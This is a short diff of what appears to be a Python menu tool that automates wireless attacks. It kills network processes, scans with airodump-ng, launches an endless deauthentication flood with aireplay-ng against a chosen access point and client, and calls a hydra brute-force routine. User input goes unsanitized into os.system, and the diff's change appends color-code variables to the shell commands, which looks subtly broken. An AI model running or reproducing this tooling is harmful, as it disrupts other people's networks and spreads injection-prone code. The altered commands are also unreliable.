@@ -81,7 +81,7 @@ while True:
   kill_process = "sudo airmon-ng check kill"
   os.system(kill_process)
 
-  auto_airodump = f"sudo airodump-ng {interface}"
+  auto_airodump = f"sudo airodump-ng {interface} {YELLOW}"
   os.system(auto_airodump)
  elif which == "2":
   interface = input(f"Enter Your Interface: ")
@@ -90,7 +90,7 @@ while True:
   os.system(f"sudo iwconfig {interface} channel {ent_ch}")
   ap = input(f"Enter The Access Point: ")
   bssid = input(f"Enter The Targets Bssid ")
-  os.system(f"sudo aireplay-ng -0 0 -a {ap} -c {bssid} {interface}")
+  os.system(f"sudo aireplay-ng -0 0 -a {ap} -c {bssid} {interface} {LIGHT_PURPLE}")
  elif which == "3":
   hydra()
  elif which == "4":
